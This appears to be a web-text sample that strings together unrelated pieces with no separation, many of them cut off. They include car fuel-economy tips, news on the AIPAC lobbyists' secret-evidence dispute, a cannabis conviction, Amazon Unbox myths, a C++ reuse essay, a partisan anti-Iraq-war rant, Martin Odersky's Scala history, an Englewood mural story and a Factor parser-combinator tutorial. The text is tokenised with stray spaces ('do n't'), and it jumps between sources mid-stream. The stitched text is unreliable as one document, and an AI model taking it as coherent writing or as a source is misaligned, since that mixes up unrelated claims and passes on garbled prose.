A straining cold engine will produce 60 per cent more pollution than a warm one .
Yet it 's these shorter journeys that are ideal for walking or cycling .
2 . Plan your route .
A bit of forethought can save much wear and tear - for the car , and the driver .
Try to take the most direct route and go off peak if possible .
Sitting in congestion means you are often doing zero miles per gallon .
If you have to commute by car , think about car sharing , Park and Ride schemes or public transport .
3 . Have your vehicle serviced regularly .
This helps maintain efficient running and good economy .
Inefficient , under - serviced engines can reduce fuel economy by ten per cent or more .
Catalytic converters are environmentally friendly - but only if they are properly maintained .
4 . Check your tyres .
Correct tyre pressures will keep wear down and fuel economy up .
Under - inflated tyres need replacing more often ( itself an environmental problem ) as well as being dangerous .
Anybody who has cycled on under - inflated tyres will appreciate how much extra effort is involved !
Make a point of checking them at least once a week .
5 . Obey the speed limits .
Try to " feather " the throttle as you reach your cruising speed .
Doing 56 mph uses 25 per cent less fuel than 70 mph and a smoother driving style can bring significant fuel saving .
But never coast to save fuel ; vehicle control must not be compromised .
6 . Reduce the drag factor by removing roof racks and carriers when not in use .
Driving with the window open also increases drag and lowers fuel economy .
Remove unnecessary boot luggage , avoid heavy accessories and wide tyres that add rolling resistance .
Air conditioning lowers fuel economy so use the vent settings as much as possible instead .
7 . Buy green fuel - and use less of it .
If you get stuck in traffic , switch off the engine .
Find out if you can buy low sulphur diesel ( City diesel ) or cleaner petrol ( low sulphur / aromatics ) locally .
8. Use “ accelerator ” sense .
Do you go straight from the accelerator to the brake ?
You would save fuel if you planned ahead , and rather than have to brake as you hit traffic , gently let the speed of the vehicle bring you to a halt as you join a queue .
There is no point in rushing and then having to brake to come to a sudden halt .
9 . Reverse in when you park .
When you start off again , the engine will be cold and at its most fuel inefficient .
If you can drive smoothly away without having to reverse when the engine is cold , not only will you save fuel you will also have better visibility .
10 .
Be a tank miser .
Why fill the tank up to the very brim ?
If you do so , you may be carrying around additional fuel , which in turn means that you have more weight on board than is necessary .
That extra weight will itself reduce fuel efficiency .

A constitutional clash is looming in a Virginia courtroom after federal prosecutors proposed barring the public from hearing some evidence at the upcoming trial of two former lobbyists for the American Israel Public Affairs Committee .
Defense lawyers for the two men , Steven Rosen and Keith Weissman , have objected vigorously to the unusual proposal to present secret evidence .
Late yesterday afternoon , a consortium of news organizations filed a motion to intervene in the case to restrain any attempt by the government to give the jury access to evidence that the public will not be permitted to examine .
" If evidence is presented in this case , the public and the press should have the right to see it , " an attorney for Mr. Weissman , John Nassikas III , told The New York Sun .
" The government has made some proposals about how to handle government evidence that we believe would deny the public the right to see it and , in turn , deny the defendants right to a public trial . "
Mr. Nassikas said he could not elaborate because details of the government 's proposal and of the defense 's response are under seal , as are many other briefs filed in the case .
The only public sign of the dispute in the court 's docket is the title of a defense motion filed last week , which made mention of an effort to " strike the government 's request to close the trial . "
A source familiar with the case said the government proposed giving jurors headphones to listen to audio recordings of intercepted and wiretapped phone conversations key to the case .
While the defendants and the judge would be able to hear the audio , the press and public would not , the source said .
" It 's a big deal , " the executive director of the Reporters Committee , Lucy Dalglish , said .
She said her group 's initial research has found no case where the government was permitted to present extensive evidence that the public never saw .
Ms. Dalglish said the proposed secrecy is the latest troubling development in a case she already finds distressing .
" I am not aware of anything as drastic as what I have heard has been mentioned in this case , " she said .
" This is a very important case in which two lobbyists are accused of violating the Espionage Act by taking information from a government source and turning it over to others , which is functionally not all that different from what reporters do every day .
We think the media and the public has an unusually direct interest in how this trial is going to be conducted . "
Messrs .
Rosen and Weissman were fired by Aipac before being indicted in 2005 on charges that they conspired to pass classified information to an Israeli official and to reporters .
The pair allegedly solicited and obtained information from a Defense Department analyst , Lawrence Franklin , who pleaded guilty and is cooperating with prosecutors .
The two former Aipac staffers have pleaded not guilty .
They have argued that they had no duty to safeguard classified information since they were not government employees or contractors , but Judge Thomas Ellis III has rejected that position .
Attorneys not involved in the case said they were perplexed by some aspects of the government 's proposal .
It was unclear , for instance , what jurors would be told about the classified information , whether they would be sworn to secrecy for life , and whether they would be told of their obligations before the trial begins .
" I have a real problem with that , " one defense lawyer , Eugene Fidell , said .
" Jurors are not , in fact , privileged characters .
They do n't have security clearances .
It sounds to me like we 're going down the path towards secret trials , which we do n't have . "
Lawyers for the two ex-lobbyists are expected to argue that special warnings to the jury about keeping evidence in the case secret could undercut the pair 's defense , which includes an argument that the information disclosed by the men did not represent a threat to America or a potential boon to a foreign government .
Defendants are guaranteed public trials in criminal cases by the Sixth Amendment to the Constitution .
The Supreme Court also has held that the press and the public have a constitutional right to witness criminal proceedings .
The judge set a hearing for tomorrow on the government 's secrecy proposal .
An entry in the court 's docket yesterday said the hearing also would be held in secret , at least for now .
The trial in the case is tentatively set for June 4 , but that date is in question after the judge suspended some legal deadlines related to the classified information to be introduced in the courtroom .
A spokesman for the prosecutors , James Rybicki , had no immediate comment yesterday .
Mr. Rosen 's attorney , Abbe Lowell , could not be reached .
Several New York - based groups that have objected to the use of secret evidence against terrorism suspects were silent yesterday about the developments in the Aipac case .
Ms Nooyi takes up the top job at Pepsico in October
She came ahead of Sonia Gandhi , the Italian - born leader of India 's Congress party , who was named 13th on the list .
PepsiCo named Ms Nooyi new boss last month .
She starts her job in October .
German Chancellor Angela Merkel came first on the list , US secretary of state Condoleezza Rice second and Chinese vice - premier Wu Yi third .
The index is based on visibility in the media as well as economic impact .
Ms Nooyi's promotion from chief financial officer will make Pepsico the second - largest US firm led by a woman .
The 50 - year - old has been with the food and drinks giant since 1994 , and in the chief financial officer role since 2001 .
She is credited with leading Pepsico 's takeover of the Tropicana fruit juice company .
Born in the southern Indian city of Madras ( Chennai ) , Ms Nooyi holds a master 's degree from the Yale School of Management .
Patricia Tabram defended herself during the court case
Grandmother defiant
Patricia Tabram , from Humshaugh , had denied charges of possessing and cultivating the drug when she appeared at Carlisle Crown Court .
She was arrested in 2005 when plants and growing equipment were seized .
Tabram had claimed she used the drug to relieve depression after the death of her son and pain following a car crash .
Last year she was spared jail after admitting possessing cannabis with intent to supply .
I am old and I am tired and I am disappointed
Patricia Tabram
After the hearing she said : " I 'm going to go on medicating .
" The police can come to my house every week .
I 'll give them a cup of tea .
" I 'll give them a decent biscuit , which of course will be medicated and I 'll give them some cannabis so they charge me again and again and again . "
The court heard how she has suffered depression since the death of her teenage son in 1975 .
She also said the drug relieved aches and pains caused by two car crashes .
Tabram said she was not afraid of going to prison
She was in breach of a six - month suspended jail sentence for the 2005 conviction when police , acting on a tip - off , found the plants in a walk - in wardrobe at her home .
Ms Tabram also told them there was powder stored in jars in her kitchen to be used in cooking .
She said : " I am old and I am tired and I am disappointed , not in the result by the jury .
" I am disappointed in the attitude of the court regarding someone my age with my health problems and the way I deal with it .
" I just want to go home and get some rest . "
Before appearing in court , the grandmother - of - two claimed she was " not afraid " of going to prison .
' Everyone 's granny '
She said she would be " everyone 's granny " and would be " treated like a queen " .
In 2005 , Judge David Hodson refused to jail Tabram , saying he did not want to make her a martyr .

But on Wednesday Judge Barbara Forrester said she could not rule out a jail term because Tabram was in breach of the suspended sentence .
Following the conviction , a Northumbria Police spokesman said : " Patricia Tabram has consistently flouted the law and Northumbria Police has a duty to act on the information we receive concerning possessing and cultivating drugs in order to enforce this law .
" We take drug abuse very seriously and are keen to use all tools at our disposal to eliminate drug dealing and use in the community . "
The Crown Prosecution Service said medicinal use of cannabis was not a legal defence to possession and cultivation of the drug .
This image , in which the ranks have closed around the sword and shield of an emblematic warrior figure constituted out of the religious faithful , foregrounds the militant and militaristic impulse embedded in this photo - practice , emerging as it does from a religious community grounded in fighting spirit and missionary zealotry .
It was a short step from a militaristic image in the service of the Christian communal to spectacular images such as Human U.S. Shield , Living American Flag , and Living Statue of Liberty , each using the American military to affirm the bonds of national community .
Mole and Thomas would spend a week or more on preparations for each photograph .
This began by tracing the desired image on a ground - glass plate mounted on Mole ’s camera .
Using a megaphone , body language , and a long pole with a white flag tied to the end to point to the more remote areas where the bulk of the troops had to be stationed , Mole would then position his helpers on the field as they nailed the pattern to the ground with miles of lace edging .
In this way , Mole also figured out the exact number of troops required .
These steps were preliminary to the many hours required to assemble and position the troops on the day of shooting .
For The Human Liberty Bell , Mole and Thomas traveled to Camp Dix , New Jersey ( not far from the City of Brotherly Love ) , to assemble 25,000 troops in the shape of this national icon .
The photo stages the Liberty Bell replete with its famous crack to increase its mimetic likeness and symbolic power .
The human inscription of the word “ LIBERTY ” at the top of the bell signals an advance over the cue cards used in earlier images , such as the Zion Shield .
Given that this patriotic symbol is composed of troops , the image delivers the platitude that American military involvement is always undertaken in defense of liberty .
Last week Amazon launched Unbox , its long rumored video download service .
In the days since its unveiling Unbox has attracted a storm of media coverage – a surprising amount of which has been misinformed and misleading .
As a service to Medialoper ’s readers , we will now attempt to debunk a few of the most persistent myths surrounding Amazon Unbox :
Myth : Amazon was first .
Various news sources are reporting on Unbox as if it was the first moon landing .
The Seattle Post - Intelligencer ’s headline proclaims “ Amazon wins race to offer online movies “ .
Fact :
What they mean is that Amazon beat Apple by a few days .
In fact , there are already quite a few services offering legal movie downloads .
If this were a race both Amazon and Apple would be finishing well behind CinemaNow and MovieLink – neither of which has been an overwhelming success .
That should tell you everything you need to know about the advantage of launching first in this market .
This is one of those races where the winner does n’t always win .
Myth : Amazon ’s reliance on Windows - based software could pay off after Microsoft starts selling its rival player , called Zune , later this year , according to the LA Times .
Fact :
As far as we know Zune wo n’t support the current generation of Windows Media DRM and Microsoft probably wo n’t license their DRM to third parties like Amazon .
If Zune is a hit it will do nothing to help Amazon Unbox .
And while we ’re on the topic handheld devices , it ’s amusing to note that Unbox officially supports exactly six portable devices .
Although , Amazon does offer a bit of hope for owners of other Windows Media compatible players :
“ If your device is Plays For Sure compliant it may work ”
Is it any wonder that Microsoft is abandoning Plays For Sure ?
Myth : Amazon ’s digital videos are reasonably priced .
Fact :
In many cases Unbox downloads are priced nearly the same as DVD ’s of the same title .
For example , consider the smash hit Bridge On The River Kwai .
The DVD edition of this 39 year old film sells for $ 18.99 , while the Unbox download sells for $ 18.99 .
The DVD gets me a product box , permanent media that ’s compatible on every DVD player in the world ( including the ones built into my Mac computers ) , and a few extras .
The Unbox edition requires me to use my own bandwidth , have adequate hard disk storage , and will only play on Windows PC ’s ( or maybe on one of those “ Plays For Sure ” devices ) .
Given the fact that my Amazon Prime membership would get me free shipping on the DVD , this does n’t seem like much of a bargain .
Myth : “ Customers are not DVD lovers or download lovers , They ’re movie lovers and TV lovers .
Then what we can do is offer choice . ” – Amazon VP of Digital Media , Bill Carr .
Fact :
Actually , I know quite a few people I would describe as DVD lovers .
Literally .
These are people who buy DVD ’s just to add them to their personal media collection – even when they may not watch a particular DVD for years , if ever .
These uber - consumers account for a fair number of DVD sales .
My guess is that the DVD loving consumer wo n’t be quick to embrace video downloads .
Myth : Lack of iPod support will hurt Amazon Unbox ’s chances of success .
Fact : Despite what I ’ve already noted about compatibility issues , I do n’t believe lack of iPod support will hurt Unbox .
The truth is that consumers are n’t clamoring to watch feature films on a 2 inch portable screen .
A bigger hinderance to the success of Unbox and similar services is the inability to burn movies to DVD .
Sure , there are scenarios where people may want to watch movies on their laptops or PC’s , but the vast majority of consumers want to watch movies on those huge screen TV ’s they ’re buying at an increasingly rapid rate .
Burnable movies would also solve the cross platform problem – DVD ’s play equally well on both Mac and Windows .
Myth : Customers who buy Unbox videos own them in the same way they own DVD’s
Fact : Despite the fact that consumers are paying essentially the same for a download as a DVD , they are n’t acquiring the same rights they would with the physical media .
Amazon ’s terms of service are unbelievably restrictive .
Amazon reserves the right to revoke or change your license at any time .
Furthermore , Amazon may delete your Unbox movies without notice .
When was the last time Amazon deleted one of your DVDs ?
Myth : Amazon is responsible for the restrictive terms of service , licensing restrictions , and DRM .
Fact : Amazon is just doing what it needs to do in order convince the movie studios that their content will be safe on the internet .
I suspect that the studios are also behind the unreasonable pricing .
Apple has had similar battles with the music industry .
The truth is that both Amazon and Apple must balance the demands of copyright holders with the needs of their customers .
Media companies currently believe they can not make a profit from digital products without some form of copy protection .
The irony is that their movies are still subject to piracy , and the restrictions and pricing will only inhibit the growth of legitimate digital download services .

As an ardent C++ developer , I ’m often traumatized by the amount of potentially useful software infrastructure that simply does n't exist .
When working in Java there are multitudes of frameworks and reusable libraries that allow many problems to be solved at high levels of abstraction without reference to the underlying technology .
So why are there so many things the C++ developer must do by hand , which a Java developer can do by reusing existing code ?
Is the lack of these frameworks and libraries one of the reasons why the language is losing ground to Java ?
In this article , I shall examine these points to see if they ’re true ; and attempt to determine the obstacles to greater code reuse in C ++.
Before we start out , let 's get a common picture of what type of code we want to reuse .
We ’ll start by making a distinction between two types of reusable code ; a plain old library containing factorised code and the more interesting case containing tools , code - generators and support libraries that provide a means of transforming between the different domains of a data model .
An example of the second is an SQL abstraction framework that takes a representation of the SQL schema and generates classes so that the relational data model can be manipulated in the object oriented domain .
In general , the problem of manipulating data in a foreign domain is tedious and time consuming .
One approach to interfacing with databases is to call an interface library , perhaps ODBC or even something more proprietary .
Such libraries will present everything needed to access the data in its relational form ; the code to maintain integrity in the relational model [ in purist terms , a proper RDBMS - relational database management system - should maintain its own integrity without relying on the programmer – ed ] and the deletes and update code must be written by hand .
This hand - written code is tedious , time - consuming to write and if not carefully managed it will create dependencies on the database interface library everywhere .
With an SQL abstraction framework , we use a description of the data model to generate both the SQL and all the code mentioned above .
In other words the mapping from relational to object model is now expressed in generated code , which means , firstly , that it does n’t need to be written by hand ; and , secondly , that the details of handling relational data and interfacing with a database are hidden behind an object oriented interface .
Most of us will agree that generating this data model transformation is a significant saving in time compared to writing it by hand .
In addition , using the generated object oriented interface means that the code using the database can focus on what it needs to do rather than the details of handling relational data and interfacing with the database .
An example of such a framework in Java is Hibernate .
Similar tools for XML and other technologies are plentiful in Java .
In C++ this infrastructure is harder to find ; it exists but normally needs to be paid for or is n’t as dependable as the Java equivalent .
So why is it that we see more of such infrastructure in Java as opposed to C ++?
Is it just that Java is the obvious choice of technology for anything involving XML or databases and these frameworks do n’t exist in C++ because nobody would use C++ for this type of problem ?
I ’m not sure that this is so self - evident ; the languages are not so different that something modelled in one cannot be modelled in the other with more or less the same level of difficulty .
However , just as portability is often a strong argument for using Java for a problem , there is also often a performance argument for using C++ ; and , for this reason , you could expect that some programmers in any problem space where Java is applied would sometimes prefer C++ solutions .
Congress has demonstrated its unconditional love for the Bush administration by handing the war profiteers another $ 100 billion worth of good reasons to keep the war in Iraq rolling along at full - throttle .
And today there was the President , whose only military experience consists of draft - dodging , going AWOL from a cushy stint in the National Guard set up by daddy , and finishing his term of duty as grounded fighter pilot , calling a press conference to inform Americans for the umpteenth time that the only way to the keep the terrorist at bay is by allowing the slaughtering in Iraq to continue ; forever apparently .
Over the past month , the majority of political discussions on cable news talk shows related to Iraq funding bill were focused on how members of Congress and especially those who are presidential candidates are consumed with worry over how their votes on funding will affect the results of the next elections .
Once elected , it would be interesting to find out exactly how long it takes for politicians to lose the ability to feel and vote with their hearts when they know that a policy such as the Iraq war is terribly wrong , without thinking about how the decision will effect the vote tally in the next election .
As citizens , we have no control over our own government .
Never in my 57 years on this earth have I been so ashamed to be an American knowing that every day that the war continues we are knowingly allowing our soldiers and innocent Iraqis to be killed or injured with absolutely no justification , other than because politicians believe it will be beneficial to their careers to allow Bush 's failed war policies to continue .
While political commentators discuss voter odds , myself and probably most Americans are sitting at home unable to watch the news without breaking down crying as the latest pictures flash on the screen showing the happy faces of the young soldiers who are now dead , knowing full well that the next night there will be more pictures of dead soldiers because the politicians have made it clear that the citizens paying their salaries have no right to demand that their elected officials put an end to the killing in Iraq .
It would be interesting to take a poll to see how often each politician even looks at the smiling faces of the dead soldiers and the second question in the poll should be , for those who claim that they do look at these faces every day and still vote to give Bush more funding , how many had to use drugs or alcohol to get to sleep during the 7 days following the vote .
For this poll , a high number of drugs and alcohol users would be viewed as positive because the reason for the question is to determine how many politicians still have the capacity to feel guilt .
Congress needs to get one thing straight , the war funding is not about politics , it is about more deaths and injuries every single day that ticks off the calendar all because Bush took this country into a senseless war based on lies .
Every single day matters to the soldiers and their families , and to those of us who feel extremely guilty about not being able to find a away to get them out of Bush 's war .
Why is there no in - depth discussion by any members of Congress on political talk shows about where these tax dollars are actually ending up , aside from an occasional flare - up of indignation about Halliburton ?
There is nothing positive in Iraq to hold up to show Americans how Iraqis have benefited from all the tax dollars already poured into a bottomless pit .
The issue of war profiteering is like the elephant in the middle of the living room , every member of Congress knows where the funding is going but Americans do n't hear them on talk shows letting people know that these kids are being killed in the name of war profits .
And the statements in speeches made by members of Congress while debating the bills do n't mean anything because 95 % of Americans never hear those speeches .
Honest politicians should be out screaming to any reporter who will listen to educate Americans about where the hundreds of billions of tax dollars have ended up .
This war is 100 times worse than Viet Nam .
A least with Viet Nam , the war profits were not being funneled over the backs of our dead soldiers in plain sight directly into the bank accounts of current and former members of the administrations in power at the time .
Nor were they being funneled to the family bank accounts of the Presidents who were in office during the Viet Nam war .
Former Nixon administration official , John Dean , has said that the Bush administration is worse than the Nixon's .
He 's right ; the Bush gang makes the Nixon administration look saintly and gives a whole new meaning to Nixon 's famous line of " I am not a crook . "
In comparison to the actions of the current regime , it could indeed be said that Mr Nixon was not a crook .
Its easy to understand why most Republicans are not about to tell the world that the leader of their party is a war profiteering crook but the question remains , when are Democrats going to start addressing the issue of who is benefiting from all this war funding and start publicly naming names along with the companies they are connected with .
They have the ability to draw press coverage and give the specific names of current and former administration officials and Bush family members who have set up companies to profit off the war or steered contracts to companies they now work .
Last year , most clearly in the fall elections , Americans told Bush and Congress to get our troops out of Iraq .
Democrats took control of Congress at the new year , and there was Bush in a televised address on January 10 , 2007 , announcing that he had ordered the deployment of five more combat brigades to serve as sitting ducks in Iraq , in addition to the 15 brigades that were already there .
Since then , he has extended combat tours from 12 months to 15 months and announced the deployment of still more troops .
According to an analysis by Hearst Newspapers , when support troops are added in , the total number of soldiers in Iraq is about 162,000 , and could be 200,000 by Christmas .
In the years to come , the history books will describe the Bush Presidency and the details of a grand war profiteering scheme nicknamed the " war on terror , " and with that in mind , members of Congress would be wise to start speaking out against the war profiteers to make damn sure that the historians will be able to report that that they were out there calling a spade a spade and trying to put an end to the death for profit disaster in Iraq .
One commentator on a recent cable talk show made the statement that when voting on the Iraq funding ; politicians are not in lock step with how strongly Americans feel about ending this war .
That comment was an understatement , because Americans are as fed up with politicians debating over the money as much as they are with the war itself .
Members of Congress and the Presidential candidates should quit trying to second guess how American will vote in the next election and think about how much longer they are going to be willing to sit at home in front of their television sets depressed and driven to tears by looking at flashes of the happy faces of soldiers who were killed that day .
As for presidential candidates , the name John Murtha should be added to the ballot , as he seems to be about the only member of Congress willing to go public and speak from the heart when trying to get the rest of Congress to recognize the need for an immediate plan to rescue our young men and women stranded in Iraq .
The candidates that are working hard to try to end the war get little credit or media coverage .
Dennis Kucinich is rarely mentioned and he is working tirelessly to come up with ways to get our soldiers out of Iraq .
By the time the 2008 election rolls around , who knows , after weighing the few options available maybe Americans will decide that no candidate who is a current member of Congress and refused to listen to the people on such an important issue as the Iraq war can be trusted to serve as President .

If you rifle the photos in reverse you see computers change from small inscrutable things to giant wonderful machines the size of industrial refrigeration units .
Wardrobes with reels of tapes ; steel desks with typewriters built into the top .
Blinking lights of indeterminate purpose .

Ideas , Languages , and Programs
A Brief History of Scala
by Martin Odersky
June 9 , 2006
Summary
A quick introduction where I come from and what led up to Scala .
Advertisement
This is my first blog at Artima.com .
I 'll be writing mostly about language design and the Scala programming language .
But first , let me introduce myself .
At university , I had my first programming class ( in Algol60 , no less ! -- I believe we were the last class to be taught in that language ) .
Whenever my program had a syntax error , the TA of the course mumbled something about my program not passing the compiler .
I deduced that a compiler would be a sort of small computer that would be sitting between my teletype and the real computer .
Its task would be to prepare my program so that the real computer could concentrate on the hard part , which would be executing the program I wrote .
It seemed to me at the time that compilation was much simpler than , say , evaluating a polynomial with Horner 's rule .
When I found out what a compiler really was , I was hooked .
I went on to write compilers for Pascal and Modula - 2 .
Afterwards , I joined Niklaus Wirth 's group at ETH Zuerich as a Ph.D. student , working on Modula - 2 and Oberon .
After that , I fell in love with functional programming and wrote a lot of papers on calculi and type systems for functional programming languages ( most of them are on my website ) .
In 1995 I learned about Java and teamed up with Philip Wadler to write a functional language that compiles to Java bytecodes .
This work on Pizza led eventually to GJ , the new javac compiler , and Java generics .
It was exciting to do work on Java because of its huge impact , but it was also very difficult because Java is a rich language with many features which often conflict with extensions in unforeseen ways .
In 1999 , I joined EPFL .
I thought that I would now use my academic freedom to do language design starting from a clean sheet .
I still wanted to combine functional and object - oriented programming , but without the restrictions imposed by Java .
I had found out about join calculus , and believed that this would be a great foundation on which to base such a unification .
The result was Funnel , a programming language for functional nets .
This was a beautifully simple design , with very few primitive language features .
Almost everything , including classes and pattern matching , would be done by libraries and encodings .
However , it turned out that the language was not very pleasant to use in practice .
Minimalism is great for language designers but not for users .
Non-expert users do n't know how to do the necessary encodings , and expert users get bored having to do them over and over again .
Also , it became quickly apparent that any new language has a chance of being accepted only if it comes with a large set of standard libraries .
Funnel led to Scala , whose design began in 2001 , and which was first released in 2003 .
Scala is not an extension of Java , but it is completely interoperable with it .
Scala translates to Java bytecodes , and the efficiency of its compiled programs usually equals Java's .
A second implementation of Scala compiles to .
NET .
( this version is currently out of date , however ) .
Scala was designed to be both object - oriented and functional .
It is a pure object - oriented language in the sense that every value is an object .
Objects are defined by classes , which can be composed using mixin composition .
Scala is also a functional language in the sense that every function is a value .
Functions can be nested , and they can operate on data using pattern matching .
The Scala user community is still relatively small , but it 's growing .
We currently see about 1000 downloads per month of the Scala distribution on our website .
I 'll write more about specific aspects of Scala in the coming blogs .
For now I log off with the " hello - world " program written in Scala :
object HelloWorld extends Application { Console.println ( " Hello World " ) }
Talk Back !

About the Blogger
Martin Odersky is the inventor of the Scala language and professor at EPFL in Lausanne , Switzerland .
In 2008 , he was appointed fellow of the ACM for his contributions to the fusion of functional and object - oriented programming .
He believes the two paradigms are two sides of the same coin , to be unified as much as possible .
To prove this , he has worked on a number of language designs , from Pizza to GJ to Functional Nets .
He has also influenced the development of Java as a co-designer of Java generics and as the original author of the current javac reference compiler .

Englewood –
So what ’s wrong with a caterpillar smoking shisha in a hookah anyway ?
Or a white rabbit popping a pill ?
Plenty , if you ’re the city of Englewood .
The city is forcing a South Broadway pipe and smoking - accessories shop to get rid of a mural painted a few weeks ago depicting characters from “ Alice ’s Adventures in Wonderland . ”
“ It ’s a cartoon , people .
Let ’s move on , ” said Mike Mahaney , owner of Headed West , at 4811 S. Broadway .
Mahaney grew tired of painting over the constant barrage of graffiti at his shop , so he had a mural painted on the walls .
All seemed fine , until some people complained that the mural was inappropriate because they said it depicted drug use .
Some members of the City Council agreed .
This week , the city said the mural , no matter what it depicts , had to go because it was too big , and murals fall under the signage code – which requires a permit that Mahaney did n’t get .
“ I wo n’t tell you everyone who ’s seen it likes it , ” said Englewood Deputy City Manager Mike Flaherty .
“ But that ’s not the reason why we are taking the action . ”
Mahaney and the artists are n’t buying it .
After all , they say , no one complained about the mural they painted on the other side of the shop a few weeks earlier , which shows Jimi Hendrix , Jerry Garcia , Jim Morrison and Janis Joplin .
“ Our art tries to inspire , take a second out of people ’s lives and say , ‘ Wow , this is cool , ” ‘ said the artist , known as Wiser .
“ It takes them back to a time when they were a little kid . ”
Wiser and his partner , Keith White , owners of yournameingraffiti.com , work with the city of Denver on its anti-graffiti campaign .
The murals , or graffiti art , deter kids from painting vandalism graffiti , Wiser said .
But some , like Dave White , owner of Englewood Auto Repair & Body Shop , across the street from Headed West , do n’t agree – at least in this case .
“ With kids around , it sends the wrong message , ” said Dave White , who complained to the city about drug overtones in the mural .
“ A lot of customers have complained about it . ”
With the prospect of a year in jail and a $ 1,000 fine with a 15 - month - old daughter at home , Mahaney says he has no choice but to comply , even though he had the pill painted out of the rabbit ’s mouth .
He has until next Friday to get rid of Alice and her gang .
But he ’s going out in style .
“ I ’m going to paint it the brightest yellow I can possibly find , ” Mahaney said .
“ And maybe some polka dots . ”

Children ’s tale an acid trip ?
Some believe “ Alice ’s Adventures in Wonderland ” is one big acid trip .
Alice chases a white rabbit , then ingests potions and mushrooms that alter her size .
Psychedelic band Jefferson Airplane wrote “ White Rabbit ” based on the 1865 Lewis Carroll story .
I was asked on IRC how to use parser combinators to write a simple translator from s-expressions to Factor quotations .
The translation was quite simple - here are some examples of how it was supposed to work :
( set a 10 ) => [ " set " " a " 10 ] ( set square ( lambda ( n ) ( * n n ) ) ) => [ " set " " square " [ " lambda " [ " n " ] [ " * " " n " " n " ] ] ]
This looked like it should be fairly simple so I put together a quick implementation .
The parser combinators were recently rewritten so this code is likely to work best with the Darcs version of Factor .
Instructions on how to get this going are at the Factor website .
Basic instructions for an Intel Linux based machine would go something like :
darcs get http://www.factorcode.org/repos cd repos / Factor make linux -x86 wget http://www.factorcode.org/boot.image.x86 ./f boot.image.x86 ./f
To run the examples from within Factor you will need to load the parser - combinators module and use it :
" contrib / parser - combinators " require USE : parser - combinators USE : lazy - lists
A parser combinator is a tuple that has specialised the ' parse ' generic word .
This word has stack effect ( input parser -- result ) .
The input is a sequence of tokens ( usually a string ) and the result is what is known as a lazy list of successes .
A ' list of sucesses ' is a list of all possible sucessful parse results .
It being lazy , each result in the list is not computed ( ie. the parse is not done ) until that list element is requested .
This is how parser combinators handle backtracking .
If the first parse result in the list is not what is required , the second can be tried , etc .
Parsers can be written manually or existing parsers can be combined together using combinators .
A number of existing parsers and combinators are provided in the ' parser - combinators ' vocabulary to build simple parsers .
To start with the s-expression parser we can handle the ' ( ' and ' ) ' using the ' token ' word .
This word returns a parser that parses only the given string :
LAZY : ' lparens ' ( -- parser ) " ( " token ; LAZY : ' rparens ' ( -- parser ) " ) " token ;
Notice these are defined with the ' LAZY : ' word instead of ':'.
This means the result of the word is a promise and needs to be forced to get the actual value .
Although not strictly necessary with these simple parsers it is required for those that recursively call themselves so I generally always define parsers using it .
Examples of usage :
" ( " ' lparens ' parse car . =>
T{ parse - result f " ( " T{ slice f " ( " 1 1 } }
The result of the parse is a lazy list .
Returning the ' car ' of that list shows the first parse result .
The ' parse - result ' tuple has two slots .
The first slot is the parse tree returned by the parser .
The second is the rest of the input string remaining to be parsed if any .
Usually the latter is a slice for efficiency purposes .
The parsers created with ' token ' return the token itself as the parse tree .
The s-expression parser needs to parse numbers and identifiers .
Numbers are digits repeated multiple times .
A parser for digits could be :
LAZY : ' digit ' ( -- parser ) [ digit ? ] satisfy ;
This uses the ' satisfy ' parser generator word .
Where ' token ' parses an input string for a specified string , ' satisfy ' will call a given quotation with the first character of the input string .
If the quotation returns ' true ' then the parse is succesful otherwise it fails .
Examples of using this definition of ' digit ' are :
" 123 " ' digit ' parse car parse - result - parsed . => 49
The ' parse - result - parsed ' word returns just the parse tree of the result from the ' parse - result ' tuple .
The result , ' 49 ' , is the character code of the successfully parsed digit .
Ideally I want the actual number returned rather than the character code .
The <@ word applies a transformation to the parse tree of a parser .
It converts an existing parser to one that does what the original parser did but has the transformation applied .
< @ takes a quotation on the stack with stack effect ( old - tree -- new - tree ) .
This quotation is called to perform the transformation .
One way to remember the effect of < @ is to note that < sign points to the parser being transformed .
Here is ' digit ' converted to return a number :
LAZY : ' digit ' ( -- parser ) [ digit ? ] satisfy [ digit > ] <@ ; " 123 " ' digit ' parse car parse - result - parsed . => 1
digit > is a standard Factor word that coverts the character code of a digit into the digit itself .
A number is one or more digits in a row .
The <+> word takes a parser as input and returns a parser that parses one or more instances of the original .
It has the same meaning as '+' in regular expressions .
This allows a ' number ' parser word to be written as :
LAZY : ' number ' ( -- parser ) ' digit ' <+> ; " 123 " ' number ' parse car parse - result - parsed . => { 1 2 3 }
Notice here that the result is an array of the digits in the number .
This is the parse tree that <+> generates - an array of the results of the original parser .
By using < @ this can be converted into a numeric value using Factor 's ' reduce ' word ( basically a left fold ) :
LAZY : ' number ' ( -- parser ) ' digit ' <+> [ 0 [ swap 10 * + ] reduce ] <@ ; " 123 " ' number ' parse car parse - result - parsed . => 123
Interestingly ' number ' actually returns more than one parse result since " 123 " contains more than one occurrence of digits in a sequence :
" 123 " ' number ' parse [ parse - result - parsed ] lmap [ . ] leach => 123 12 1
It returns the longest match first which is what we usually want .
As the list is lazy if we do n't request anything beyond the first match then the remaining parse results are n't actually computed .
Next on the list is identifiers .
These are any sequences of characters that are not numbers , spaces , or parenthesis .
The ' satisfy ' word can be used for this , combined with <+> :
LAZY : ' identifier ' ( -- parser ) [ [ blank ?
not ] keep [ digit ?
not ] keep [ CHAR : ( = not ] keep CHAR : ) = not and and and ] satisfy <+> [ > string ] <@ ; " foo " ' identifier ' parse car parse - result - parsed . => " foo "
The < @ > word is used to transform the result into a string otherwise we'd get an array of the character codes in the identifier as a result .
Often it is desired to parse either a number or an identifier .
The ' atom ' word does this :
LAZY : ' atom ' ( -- parser ) ' identifier ' ' number ' < |> ; " 123 " ' atom ' parse car parse - result - parsed . => 123 " foo " ' atom ' parse car parse - result - parsed . => " foo "
It uses < | > , known as the choice word .
It takes two parsers on the stack , and generates a parser which when run will try the first parser on the input string .
If it fails it will then try the second parser .
It returns the list of successes resulting from both parses .
A first cut at parsing a single expression like ' ( set a 10 ) ' requires a sequencing parser combinator .
This is ' < &>'.
It takes two parsers and returns a resulting parser which when run will run the first parser on the input string , and then run the second parser on the remaining unparsed portion of the input string of each result from the first parser .
A simple expression parser might look like :
LAZY : ' expr1 ' ( -- parser ) ' lparens ' ' atom ' < &> ' rparens ' < &> ; " ( 123 ) " ' expr1 ' parse car parse - result - parsed . => { { " ( " 123 } " ) " }
This results in a very ugly parse tree .
The ' < & >' word returns a parse tree which is an array of the two parsers it uses .
Since we have two ' < &>' calls we get nested results .
This can be fixed using two variants of ' < &>'.
They are ' < & ' and ' & > ' .
